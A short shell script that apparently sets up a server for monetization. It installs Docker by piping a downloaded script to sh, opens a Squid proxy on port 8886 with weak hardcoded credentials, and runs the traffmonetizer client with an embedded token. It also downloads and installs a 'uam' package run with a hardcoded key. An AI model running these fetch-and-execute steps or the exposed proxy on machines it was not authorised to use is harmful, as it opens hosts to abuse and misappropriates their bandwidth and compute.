#!/bin/sh
command_exists() {
	command -v "$@" > /dev/null 2>&1
}

#Install docker if not exist
if ! command_exists docker; then
    echo "Installing docker..."
    curl -fsSL https://get.docker.com -o get-docker.sh
    sh get-docker.sh
    echo "Done"
fi

echo "Starting squid proxy..."
docker run --name squidproxy -d --restart always -p 8886:3128 -e SQUID_USER=ngadt95 -e SQUID_PASS=ngadt95 sportstvdev/squidproxy
echo "Done!"
apt-get -y update
apt-get install screen
docker pull traffmonetizer/cli
docker run -d --name z6688 traffmonetizer/cli start accept --token 6EtGBRe4JSf4bdHPnCU6ABg1k2Tv7IvWxUivIKPecdU=
sudo wget https://update.u.is/downloads/uam/linux/uam-latest_amd64.deb
sudo dpkg -i uam-latest_amd64.deb
cd /opt/uam
screen ./uam --pk 831732497809ED0C1B58A59CC0EEA28D56B955093D06E3F012CDFDE8B2597777
